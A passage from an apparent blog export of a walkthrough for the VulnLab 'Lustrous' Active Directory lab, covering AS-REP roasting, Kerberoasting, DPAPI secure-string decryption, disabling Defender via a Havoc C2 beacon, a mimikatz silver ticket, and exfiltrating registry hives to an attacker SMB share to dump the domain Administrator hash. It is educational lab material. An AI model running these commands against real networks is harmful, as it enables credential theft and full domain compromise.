Administrator's home directory. Make sure to remove the `500` identifier at the end of it since that relates to the Administrator user.\n* RC4 for SVC_WEB: We don't have access to this, but we can generate an RC4 ticket online [here](http://rc4.online-domain-tools.com/). We can use their password as both the input text and the key to generate the hash.\n* ID for `tony.ward`: You can find this in Bloodhound in the user's node underneath `Object ID`. Their ID should be `1114`.\n\nWith that we can build out the command for Mimikatz, which will upload through Havoc. Remember to disable AV so that `mimikatz` isn't blocked.\n\n```\n01/06/2024 20:57:23 [5pider] Demon » powershell Set-MpPreference -DisableRealtimeMonitoring $true\n\n01/06/2024 20:58:48 [5pider] Demon » upload (LOCAL PATH)/mimikatz.exe\n```\n\nWe'll then move back to the RDP session to execute `mimikatz` properly. This is due to some conflictions I ran into with Havoc, so we'll run it on the RDP session in the meanwhile.\n\n```\nPS C:\\Users\\Administrator\\Desktop> .\\mimikatz.exe \"kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /target:lusdc.lustrous.vl /service:HTTP /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /id:1114 /target:lusdc.lustrous.vl /ptt\" \"exit\"\n```\n\nThis should submit the Silver ticket for the current session that we are in. It will be say `Golden` ticket at the bottom but since we're requesting it from the context of a service account, it's a silver ticket.\n\nLet's now try to authenticate to the web service in our `tony.ward` login session.\n\n```\n(iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials).Content\n\n<td>\nPassword Reminder\n</td>\n<td>\n[...snip...]\n</td>\n<td>\nlustrous_tony.ward\n```\n\nAs you can see in the above output, we have successfully gained the credentials to `tony.ward` by abusing Kerberos HTTP authentication! We can now attempt to enumerate the DC as this user.\n\n# Exploiting SeBackupPrivilege Remotely\n\nYou'll notice relatively quickly that this user does not have RDP or WinRM access, though that isn't an overly large issue.\n\nWe made the assumption that we have `SeBackupPrivilege` enabled as this user due to the name of their `Backup Admins` group. Even though we can't access the machine and get a shell, we can still exploit this privilege remotely.\n\nTo do this, we'll use `impacket-reg` to access the registry remotely and pull the SAM, SYSTEM, and SECURITY databases from the DC. I've also stood up a simple SMB server through `impacket-smbserver` so we can download them to our machine.\n\n```\n└─$ impacket-smbserver smb share/ -smb2support\n\n└─$ impacket-reg lustrous.vl/'tony.ward':'U_cPVQqEI50i1X'@10.10.169.5 -dc-ip 10.10.169.5 backup -o \\\\\\\\(IP)\\\\smb\n```\n\nThis may take some time, as the SYSTEM database is a really large file. I've also ran into a few NETBIOS timeouts when running this, feel free to do a bit of trial and error with this tool. There also is an alternative with `BackupOperatorToDA`, which will perform a similar action.\n\nAnother note, I've had luck downloading the registry hives individually, you can do so with the below commands. Just make sure to wait a bit in between downloads so you don't receive an invalid handle error.\n\n```\n└─$ impacket-reg lustrous.vl/'tony.ward':'U_cPVQqEI50i1X'@10.10.251.85 save -keyName 'HKLM\\SAM' -o \\\\\\\\10.8.0.173\\\\smb_share\n\n└─$ impacket-reg lustrous.vl/'tony.ward':'U_cPVQqEI50i1X'@10.10.251.85 save -keyName 'HKLM\\SECURITY' -o \\\\\\\\10.8.0.173\\\\smb_share\n\n└─$ impacket-reg lustrous.vl/'tony.ward':'U_cPVQqEI50i1X'@10.10.251.85 save -keyName 'HKLM\\SECURITY' -o \\\\\\\\10.8.0.173\\\\smb_share\n```\n\nAfter it's finished, you should have all three files in the respective directory you used for the SMB server. We can now use these three files to dump the machine account NTLM hash for `LUSDC$`. (Make sure to close out of your SMB server so you don't receive a `read-length` error)\n\n```\n└─$ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL\n\n[*] Target system bootKey: 0x9619c4c8e8d0c1e1314ca899f5573926\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\n......\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:[...snip...]\n```\n\nThe NTLM hash for the `LUSDC$` has the username identifier `$MACHINE.ACC`. Although these names are different, this is the same user. Now that we have credentials to the machine account, we can use `impacket-secretsdump` once more to dump the Administrator user's NTLM hash.\n\n```\n└─$ impacket-secretsdump lustrous.vl/'LUSDC$'@lusdc.lustrous.vl -hashes aad3b435b51404eeaad3b435b51404ee:[...snip...] -just-dc-user Administrator\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nNow that we have the Administrator's NT hash, we can now use that to authenticate via WinRM to the DC!\n\n![](/images/vulnlab/lustrous-vl/j.jpg)\n\nWe can now access the Administrator's Desktop directory to view the root flag, in `C:\\Users\\Administrator\\Desktop\\root.txt`. This means we have successfully completed this chain!\n\n![](/images/vulnlab/lustrous-vl/k.jpg)\n\n# Conclusion\n\nI will say that despite needing to get a nudge from a few of the other writeups, I learned a lot from this chain. Like I said before, I didn't know you could create silver tickets to HTTP or really a lot of other services. I know for next time I do an AD box similar to this, I'll use this experience to check out a few other avenues. Big thanks to xct for the development of this machine - it helped me learn way more than I knew before.\n\n# Resources\n\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://github.com/BloodHoundAD/BloodHound\nhttps://github.com/HavocFramework/Havoc\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords\nhttps://github.com/ParrotSec/mimikatz\nhttps://github.com/skelsec/pypykatz\nhttps://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134\nhttps://vulndev.io/2021/12/27/lab-lustrous-walkthrough/\nhttps://docs.axway.com/bundle/axway-open-docs/page/docs/apigtw_kerberos/kerberos_overview/index.html#:~:text=Kerberos%20authentication%20based%20on%20Simple,are%20transmitted%20in%20HTTP%20headers.\nhttps://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication\nhttps://github.com/dirkjanm/ldapdomaindump\nhttp://rc4.online-domain-tools.com/\nhttps://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets\n","slug":"lustrous","published":1,"updated":"2024-06-05T20:50:56.449Z","_id":"clx2az5wx000081uffu7ggtes","comments":1,"layout":"post","photos":[],"content":"<p>This machine is an Active Directory environment that starts from the domain controller and pivots to a workstation before returning back to the DC. Given that we have two machines that are both Windows, I’d like to use Havoc instead of Sliver as our C2 for this walkthrough.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Given the IP range of the instance it seems that there are only two machines to this chain. Let’s start with our usual NMAP scans across them both.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 22:59 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.226.53</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 985 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">21/tcp   open  ftp</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">443/tcp  open  https</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 18.60 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 23:00 EDT</span><br><span class=\"line\"></span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 23:00 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.226.54</span><br><span class=\"line\">Host is up (0.13s latency).</span><br><span class=\"line\">Not shown: 996 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 23.69 seconds</span><br></pre></td></tr></table></figure>\n\n<p>I ran a few aggressive scans after this, it seems that both of these machines are Windows machines. The DC seems to be running on <code>.53</code> and a regular workstation is running on <code>.54</code>. The interesting part is that the entry point seems to be on <code>.53</code> as there are both HTTP and FTP ports enabled (with FTP having anonymous access).</p>\n<p>I’ll also note down both of the DNS names for both machines below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Machine 1 - LusDC.lustrous.vl</span><br><span class=\"line\">Machine 2 - LusMS.lustrous.vl</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ASREP-roasting-ben-cox\"><a href=\"#ASREP-roasting-ben-cox\" class=\"headerlink\" title=\"ASREP-roasting ben.cox\"></a>ASREP-roasting <code>ben.cox</code></h1><p>Accessing the anonymous FTP instance gives us a file directory with 4 users, one of which being <code>ben.cox</code>. The file that they have in their home directory is <code>users.csv</code>, which seems to be a file that contains a few more users. I created a user list with mousepad, consisting of 5 users along with a few default users.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Administrator</span><br><span class=\"line\">Guest</span><br><span class=\"line\">krbtgt</span><br><span class=\"line\">ben.cox</span><br><span class=\"line\">rachel.parker</span><br><span class=\"line\">tony.ward</span><br><span class=\"line\">wayne.taylor</span><br><span class=\"line\">SQLServer2005SQLBrowserUser$LUSDC</span><br></pre></td></tr></table></figure>\n\n<p>Given that we have a user list, we can run some basic Kerberos tests such as <code>GetNPUsers</code> and <code>GetUserSPNs</code> to see if any users are either kerberoastable or ASREProastable.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-GetUserSPNs lustrous.vl/&#x27;Guest&#x27;@10.10.226.53 -dc-ip 10.10.226.53 -dc-host LusDC.lustrous.vl -usersfile ul.txt -request</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-GetNPUsers lustrous.vl/&#x27;Guest&#x27;@10.10.226.53 -dc-ip 10.10.226.53 -dc-host LusDC.lustrous.vl -usersfile ul.txt -request</span><br><span class=\"line\"></span><br><span class=\"line\">$krb5asrep$23$ben.cox@LUSTROUS.VL:cb02cfec[...snip..]d749d0fc98c0c0731436c</span><br></pre></td></tr></table></figure>\n\n<p>In our ASREP enumeration scan, you’ll find that <code>ben.cox</code> has pre-auth enabled. </p>\n<p>When a user is trying to authenticate to a machine in the domain, they’ll send an AS-REQ to the KDC to request for this login. If the request is valid and the authentication material is correct, the KDC will deliver an AS-REP in response to allow them to connect to their machine. If a user has <code>UF_DONT_REQUIRE_PREAUTH</code>, this means that they do not require any form of authentication or identification to request an AS-REP. The request has the users password hashed within it, meaning it is vulnerable to hash cracking.</p>\n<p>This is the case for the <code>ben.cox</code> user, as <code>impacket-GetNPUsers</code> essentially used our user list to brute force all users to determine if they have <code>UF_DONT_REQUIRE_PREAUTH</code> set. Now that we have a valid AS-REP ticket, we can use <code>hashcat</code> to see if we can crack it. Make sure to copy the AS-REP ticket to a text file before using it with hashcat.</p>\n<p>One more thing, you can find the specific hash cracking algorithm ID number to use on the example hashes website that <code>hashcat</code> provides <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">here</a>. We’re looking at ID 18200 for cracking KRB5 ASREP hashes for the request we have.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 18200 bencox.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\"></span><br><span class=\"line\">[...snip...]65fe3adb19d749d0fc98c0c0731436c:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>The above command should crack it for you, and it should return a valid password for <code>ben.cox</code>. You can verify that this works by testing it against LDAP.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.226.53 -u &#x27;ben.cox&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.226.53    445    LUSDC            [*] Windows Server 2022 Build 20348 x64 (name:LUSDC) (domain:lustrous.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.226.53    389    LUSDC            [+] lustrous.vl\\ben.cox:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Dumping-the-Domain\"><a href=\"#Dumping-the-Domain\" class=\"headerlink\" title=\"Dumping the Domain\"></a>Dumping the Domain</h1><p>If you attempt to use it for other services such as RDP, you’ll notice that your creds won’t be valid. That being said now that we have valid creds to LDAP, we can use them to dump all domain objects with <a href=\"https://github.com/BloodHoundAD/BloodHound\">Bloodhound</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;lustrous.vl&#x27; -u &#x27;ben.cox&#x27; -p &#x27;[...snip...]&#x27; -c all -ns 10.10.226.53 --zip</span><br></pre></td></tr></table></figure>\n\n<p>This should compress all of the domain objects into an archive which is compatible with Bloodhound. Omitting <code>--zip</code> will dump all of the objects based on categories (users, machines, etc.) which are still technically compatible, it’s just much easier to do it through an archive.</p>\n<p>After starting Neo4j console and the GUI we’ll upload our data and look around for any leads with our current user.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/b.jpg\"></p>\n<p>You’ll notice that our user <code>ben.cox</code> is within the <code>Remote Access</code> group, which I would assume is the equivalent of having <code>CanPSRemote</code> though I couldn’t verify it off of Bloodhound.</p>\n<h1 id=\"Foothold-as-ben-cox\"><a href=\"#Foothold-as-ben-cox\" class=\"headerlink\" title=\"Foothold as ben.cox\"></a>Foothold as <code>ben.cox</code></h1><p>I tested our access through WinRM, and it seems that we’re able to access <code>LusMS</code> with our credentials.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/c.jpg\"></p>\n<p>Now that we have access through WinRM, let’s look around the machine to see if there’s anything we can download.</p>\n<p>Furthermore I also wanted to set up <a href=\"https://github.com/HavocFramework/Havoc\">Havoc C2</a> and plant a beacon onto this machine just so we can download and upload files easily. The reason as to why I’m using Havoc instead of Sliver is due to the fact that this first machine has AV enabled. Due to Havoc being a relatively new C2, the signatures for the binaries aren’t detected in the current OS that these machines are running.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/d.jpg\"></p>\n<p>We can now look around on the machine to determine if there’s anything interesting for us to find. </p>\n<h1 id=\"DPAPI-Secure-String-Decryption\"><a href=\"#DPAPI-Secure-String-Decryption\" class=\"headerlink\" title=\"DPAPI Secure String Decryption\"></a>DPAPI Secure String Decryption</h1><p>You’ll find an odd XML file on the machine within the <code>Desktop</code> directory of <code>ben.cox</code> after a bit of searching.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\ben.cox\\Desktop&gt; cat admin.xml</span><br><span class=\"line\">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;</span><br><span class=\"line\">&lt;S N=&quot;UserName&quot;&gt;LUSMS\\Administrator&lt;/S&gt;[...snip...]N=&quot;Password&quot;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4ecf9dfb12aed4eab72b909047c4e560000000002000000000003660000c000000010000000d5ad4244981a04676e2b522e24a5e8000000000004800000a00000001000000072cd97a471d9d6379c6d8563145c9c0e48000000f31b15696fdcdfdedc9d50e1f4b83dda7f36bde64dcfb8dfe8e6d4ec059cfc3cc87fa7d7898bf28cb02352514f31ed2fb44ec44b40ef196b143cfb28ac7eff5f85c131798cb77da914000000e43aa04d2437278439a9f7f4b812ad3776345367&lt;/SS&gt;</span><br><span class=\"line\">    &lt;/Props&gt;</span><br><span class=\"line\">  &lt;/Obj&gt;</span><br><span class=\"line\">&lt;/Objs&gt;</span><br></pre></td></tr></table></figure>\n\n<p>At first you’ll think that this is a hash for the Administrator user, though it won’t be detected by <code>JTR</code> or <code>Hashcat</code> properly. That’s because it isn’t - given that <code>System.Management.Automation.PSCredential</code> specifier. This tells us that it is a <a href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords\">DPAPI credential</a> - though it’s the secure string version of the credential instead of a credential blob.</p>\n<p>DPAPI is a Windows-specific symmetric encryption of asymmetric private keys, and is used as a way to properly cache data without leaving them in plaintext around the machine. This is another method to storing credentials - as the data is encrypted using a key that is derived from the user’s logon secrets or credentials.</p>\n<p>I’ve worked with DPAPI credentials as a privilege escalation route before, and relatively straightforward. All that’s required on our behalf is to find both the <code>masterkey</code> and the <code>prekey</code> in order to decrypt the secure string. The <code>masterkey</code> can be found within <code>C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117</code> and is denoted by the </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117&gt; Get-ChildItem . -Force</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\Users\\ben.cox\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2355092754-1584501958-1513963426-1117</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">-a-hs-        12/26/2021  10:28 AM            904 BK-LUSTROUS</span><br><span class=\"line\">-a-hs-        12/26/2021  10:28 AM            740 dff9ecd4-2ab1-4eed-ab72-b909047c4e56</span><br><span class=\"line\">-a-hs-        12/26/2021  10:28 AM             24 Preferred</span><br></pre></td></tr></table></figure>\n\n<p>Normally we’d just use <a href=\"https://github.com/ParrotSec/mimikatz\">Mimikatz</a> and use the <code>masterkey</code> to decrypt the credential, but not only do we not have debug privilege to do that - we also don’t have the ability to run <code>mimikatz</code> due to our low-level privilege. (And also we aren’t dealing with a blob, but instead a secure string)</p>\n<p>We’ll need to do this locally in order to decrypt the string efficiently. We can use a tool called <a href=\"https://github.com/skelsec/pypykatz\">PyPyKatz</a>, which is a built-in tool on the latest version of Kali.</p>\n<p>First we’ll need to develop a few pre-keys to retrieve a proper plaintext <code>masterkey</code> that’s derived on the domain SID and our current user’s credentials.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ pypykatz dpapi prekey password &#x27;S-1-5-21-2355092754-1584501958-1513963426-1117&#x27; &#x27;[...snip...]&#x27;</span><br><span class=\"line\">76409e35c7b1e6cb267597498c3b9707b4884d3a</span><br><span class=\"line\">ca7dff911d9d033bfb16392388405b95a58e1896</span><br><span class=\"line\">ea6776f7e4fc1866d86e2858393ceee0c62020e0</span><br></pre></td></tr></table></figure>\n\n<p>We’ll now need to use one of these 3 pre-keys to develop the plaintext version of the <code>masterkey</code>. We can download the <code>masterkey</code> locally and use it as the file to run <code>pypykatz</code> against.</p>\n<p>I got lucky with the last pre-key, it seems that the other above it are invalid. It really all comes down to trial-and-error, run each pre-key against <code>pypykatz</code> to see which one of them works.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ pypykatz dpapi masterkey ~/tech/vl/lustrous/dff9ecd4-2ab1-4eed-ab72-b909047c4e56 ea6776f7e4fc1866d86e2858393ceee0c62020e0 -o mkf</span><br></pre></td></tr></table></figure>\n\n<p>This will save the <code>masterkey</code> into a JSON-formatted file that <code>pypykatz</code> can parse in our next command. If you don’t run it with <code>-o (filename)</code>, you’ll see that the decrypted <code>masterkey</code> will be printed out to the screen.</p>\n<p>Let’s now use our decrypted <code>masterkey</code> to decrypt the secure string. I saved the secure string to a <code>txt</code> file which seemed to work for me.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ pypykatz dpapi securestring mkf admin_1.txt</span><br><span class=\"line\">Error! non-hexadecimal number found in fromhex() arg at position 2</span><br><span class=\"line\">HEX: 58005a00390069003d006200670[...snip...]e003900640052004600</span><br><span class=\"line\">STR: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see next to <code>STR</code> is the decrypted password for the Administrator user. Seems that we were able to decrypt it properly and can now use it to authenticate to the machine!</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/e.jpg\"></p>\n<p>The first flag is within <code>C:\\Users\\Administrator\\Desktop\\flag.txt</code>. I’ll also run our Havoc binary again so we can load a beacon as this user.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/f.jpg\"></p>\n<p>Our next goal is to enumerate what we can do on this machine and see how we can get onto the DC.</p>\n<h1 id=\"Pivoting-to-the-DC\"><a href=\"#Pivoting-to-the-DC\" class=\"headerlink\" title=\"Pivoting to the DC\"></a>Pivoting to the DC</h1><p>So at this point, one of my pals and I were doing the chain for four to five hours and we had essentially tried everything out that we could possibly try - ADCS, LDAP Pivoting, cached credentials, password reusage, pretty much everything we could think of. I looked at the hint on the Wiki and it had told us to look at the hair of the person on the box image. I had interpreted it as white hair originally, but we when kept trying to understand what it was - we realized it had to be something with Kerberos.</p>\n<p>That being said I want to give credit where credit is due since we did need a couple nudges for this. It definitely helped me learn to think a bit outside the box, so you can find the two writeups we nudged for this section below. The credit goes to them.</p>\n<p><a href=\"https://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134\">https://thebinary0x1.medium.com/lustrous-vulnlab-walkthrough-f314f8b86134</a> - <code>nmht3t</code><br><a href=\"https://vulndev.io/2021/12/27/lab-lustrous-walkthrough/\">https://vulndev.io/2021/12/27/lab-lustrous-walkthrough/</a> - <code>xct</code></p>\n<p>So if you had looked around the DC - you would’ve seen that port 80 was open. When accessing this, you would’ve immediately come into a regular IIS website that doesn’t really tell you much. Brute forcing the directories doesn’t help with much either - as there isn’t anything out of the ordinary to compromise. However, if you had bound the DC’s domain name, <code>LusDC.lustrous.vl</code> to the IP address of the DC, you’ll come into contact with another page if you try to access it through HTTP.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/g.jpg\"></p>\n<p>Right now it’s telling us that we do not have access to the website due to invalid credentials. But that’s odd right - it didn’t prompt us to enter in any credentials beforehand.</p>\n<p>This is where a new type of authorization came into picture that I have never learned about before - Kerberos authentication to HTTP.</p>\n<h1 id=\"Kerberos-Authentication-to-HTTP\"><a href=\"#Kerberos-Authentication-to-HTTP\" class=\"headerlink\" title=\"Kerberos Authentication to HTTP\"></a>Kerberos Authentication to HTTP</h1><p>So I’ve done alternate service delegation before with Cobalt Strike - and most of what I’ve done involved CIFS, LDAP, and MSSQL. What’s interesting is that these are not the only services in AD that use Kerberos Authentication. There’s a wide variety of services that can be used for Kerberos auth, and in our case we’ll be looking at HTTP. You can find some resources for HTTP authentication through Kerberos <a href=\"https://docs.axway.com/bundle/axway-open-docs/page/docs/apigtw_kerberos/kerberos_overview/index.html#:~:text=Kerberos%20authentication%20based%20on%20Simple,are%20transmitted%20in%20HTTP%20headers.\">here</a> and <a href=\"https://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication\">here</a>.</p>\n<p>Essentially, Kerberos authentication can be passed into HTTP headers based on the context of the current user that is trying to access it. Service tokens are issued in the context of the user and they are injected into headers before accessing the site. If the user has the correct header in relation to the service’s cache, they’ll be allowed access into the web service.</p>\n<p>For our case, we can actually access this website through a logon session as <code>ben.cox</code>. You’ll need to access RDP through the <code>LusMS</code> machine as the Administrator since <code>ben.cox</code> does not have RDP logon privileges.</p>\n<p>If you try to access the website through Edge, you’ll get redirected to an actual login panel.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/h.jpg\"></p>\n<p>We won’t be able to authenticate with our Administrator credentials since they’re specific to our machine - but we can access with <code>ben.cox</code>‘s credentials since they’re a domain user.</p>\n<p>You’ll get redirected to a website called <code>Secure Notes</code>, which seems to be utilizing SSO to authenticate to our machine. This is what we had inferred originally, so it looks like we are correct.</p>\n<p>Within the <code>Notes</code> tab, you’ll find an interesting web page that seems to be a password reminder.</p>\n<p><img src=\"/images/vulnlab/lustrous-vl/i.jpg\"></p>\n<p>The password for <code>ben.cox</code> seems to be relayed in plaintext. We can guess from here that any user that accesses this website using their credentials will have their password printed in plaintext in this specific tab. We also are reaffirmed of our Kerberos authentication theory in the <code>Task</code> row underneath the password.</p>\n<p>So from here - we’ll need compromise other users and get them to authenticate to this website in order to retrieve this password.</p>\n<p>In order to do this - we’ll need to use another account as <code>ben.cox</code> does not have any pertinent permissions&#x2F;delegation over any of the other domain users. However, if you’ll take a look back at Bloodhound, there are around 26 domain users that are within this domain. We had only tried to Kerberoast&#x2F;ASREProast four of them at the beginning of this machine, so let’s see if there are any other tickets we can retrieve with those user.</p>\n<p>I made a one-liner that creates a user list based on <a href=\"https://github.com/dirkjanm/ldapdomaindump\">LDAPDomainDump</a>. This required dumping the domain once more, to which I also believe this is a built-in Kali tool. We’ll use the <code>domain_users.json</code> file as the file to create a wordlist with, which should be generated automatically when we dump LDAP again.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat domain_users.json | grep &#x27;@lustrous.vl&#x27; | awk &#x27;&#123;print $1&#125;&#x27; | cut -d &#x27;&quot;&#x27; -f 2 | cut -d &#x27;@&#x27; -f 1 &gt; inc_list.txt</span><br></pre></td></tr></table></figure>\n\n<p>We now have a user list to use, and we’ll <code>GetUserSPNs</code> once more to test for Kerberoasting.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-GetUserSPNs -dc-ip 10.10.169.5 -usersfile inc_list.txt -request lustrous.vl/&#x27;ben.cox&#x27;:&#x27;Trinity1&#x27;</span><br><span class=\"line\">......</span><br><span class=\"line\">$krb5tgs$23$*svc_db$LUSTROUS.VL$svc_db*$4a204336b40ac1892e413b8f5da6[...snip...]</span><br><span class=\"line\">$krb5tgs$23$*svc_web$LUSTROUS.VL$svc_web*$0e561f7154d282c3b6f0f00eb40d67f2$23e81c[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we received two hits for <code>svc_db</code> and <code>svc_web</code>. We can crack both of these Kerberos tickets to attempt to receive a password for either of these users.</p>\n<p>We’ll use <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">hashcat</a> for this as it has an identifier to crack Kerberos 5 <code>e-type 23</code> TGS-REP tickets. The identifier that we’ll need to use is <code>13100</code>.</p>\n<p>You won’t find any hits for <code>svc_db</code>, but you will for the <code>svc_web</code> user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 13100 wr_svc_web.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">[...snip...]b3ba4bf7aba1a0dab346ec2bc2f1895636e7b32c585ece443cf97ab20fc8a767c4c42ad123540f1344e81ee2aea7649146acdae88c5ded877:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>We can guess based on the name of the account that this is the service account for the HTTP service - and given that now have access to that account, we can technically request a valid TGT to HTTP for any user on the domain.</p>\n<h1 id=\"Silver-Ticket-for-tony-ward\"><a href=\"#Silver-Ticket-for-tony-ward\" class=\"headerlink\" title=\"Silver Ticket for tony.ward\"></a>Silver Ticket for <code>tony.ward</code></h1><p>You can request it for any user - though if you look back at Bloodhound you’ll find interest in the <code>tony.ward</code> domain user. It seems that <code>tony.ward</code> is part of the <code>Backup Admins</code> group, which can hint at the fact that they might have <code>SeBackupPrivilege</code> enabled locally.</p>\n<p>So let’s try to request one as this user. We’ll do this from our RDP session as Administrator due to the fact that it should launch a separate PowerShell window when we generate a new logon through Mimikatz.</p>\n<p>Firstly though, we’ll need a few things to generate a Silver ticket for this user. I’ve compromised a list of what we’ll need and where you can find it below.</p>\n<ul>\n<li>Domain SID - We can find this in a few places, the easiest is in <code>AppData\\Roaming\\Microsoft\\Protect</code> in the Administrator’s home directory. Make sure to remove the <code>500</code> identifier at the end of it since that relates to the Administrator user.</li>\n<li>RC4 for SVC_WEB: We don’t have access to this, but we can generate an RC4 ticket online <a href=\"http://rc4.online-domain-tools.com/\">here</a>. We can use their password as both the input text and the key to generate the hash.</li>\n<li>ID for <code>tony.ward</code>: You can find this in Bloodhound in the user’s node underneath <code>Object ID</code>. Their ID should be <code>1114</code>.</li>\n</ul>\n<p>With that we can build out the command for Mimikatz, which will upload through Havoc. Remember to disable AV so that <code>mimikatz</code> isn’t blocked.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">01/06/2024 20:57:23 [5pider] Demon » powershell Set-MpPreference -DisableRealtimeMonitoring $true</span><br><span class=\"line\"></span><br><span class=\"line\">01/06/2024 20:58:48 [5pider] Demon » upload (LOCAL PATH)/mimikatz.exe</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then move back to the RDP session to execute <code>mimikatz</code> properly. This is due to some conflictions I ran into with Havoc, so we’ll run it on the RDP session in the 